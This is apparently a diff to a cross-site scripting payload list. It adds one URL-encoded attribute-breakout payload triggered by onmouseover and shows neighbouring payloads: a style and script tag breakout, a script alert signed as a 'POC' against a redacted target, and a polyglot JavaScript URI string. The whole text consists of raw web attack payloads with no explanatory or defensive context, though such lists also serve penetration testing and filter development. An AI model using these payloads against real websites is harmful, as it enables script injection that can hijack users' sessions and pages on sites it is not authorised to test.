@@ -1,3 +1,4 @@
+%22%20onmouseover=alert(document.domain)%20x=%22
 %3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(document.domain)%3C/scRipt%3E
 ><​script%3("hello")<​/script><​Script>alert("IIT ******** XSS VULNERABILITY POC BY V4N")<​/script>
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
